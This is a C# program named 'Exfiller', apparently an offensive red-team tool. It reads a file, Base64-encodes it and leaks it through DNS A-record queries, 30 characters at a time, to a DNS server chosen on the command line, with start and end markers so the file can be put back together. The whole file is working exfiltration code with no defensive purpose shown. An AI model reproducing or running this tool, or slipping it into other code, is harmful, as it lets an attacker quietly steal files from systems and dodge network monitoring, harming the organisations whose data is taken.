using DnsClient;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace Exfiller
{
	class Program
	{
		static void Main(string[] args)
		{
			// Setup DNSClient variables using command line argument as the target DNS server
			String targetDNSServer = args[1];
			var endpoint = new IPEndPoint(IPAddress.Parse(targetDNSServer), 53);
			var client = new LookupClient(endpoint);

			// Target domain to append Base64 encoded data to.  This doesn't really matter and doesn't need to be valid
			String targetDomain = ".test.local";

			var path = args[0];
			if (File.Exists(path))
			{
				var fileContentBytes = File.ReadAllBytes(args[0]);
				String b64File = Convert.ToBase64String(fileContentBytes);
				// Convert any equals signs to dashes so they can be included in a URL
				b64File = b64File.Replace("=", "-");


				// Loop over Base64 data and send 30 characters at a time as a DNS request appended to the provided domain
				Console.WriteLine("\n[*] Sending DNS requests to " + targetDNSServer);

				// Set counter to start at 1 and send start of file identifier
				client.Query("11111" + args[0].Replace(".", "-") + "11111" + targetDomain, QueryType.A);
				int counter = 1;

				for (int i = 0; i < b64File.Length; i += 30)
				{
					try
					{
						var result = client.Query(b64File.Substring(i, 30) + targetDomain, QueryType.A);
						counter++;
					}
					catch
					{
						var result = client.Query(b64File.Substring(i) + targetDomain, QueryType.A);
						counter++;
					}
				}

				// Send end of file identifier
				client.Query("000000000000000" + targetDomain, QueryType.A);

				Console.WriteLine($"\n[+] Successfully sent file '{args[0]}' over {counter} DNS requests to {targetDNSServer}");



				//b64File = b64File.Replace("-", "=");
				//Byte[] b64FileBytes = Convert.FromBase64String(b64File);
				//String originalFile = Encoding.Default.GetString(b64FileBytes);
				//Console.WriteLine("\nOriginal content: " + originalFile);
			}
			else
			{
				Console.WriteLine("Error reading file!");
			}
		}
	}
}
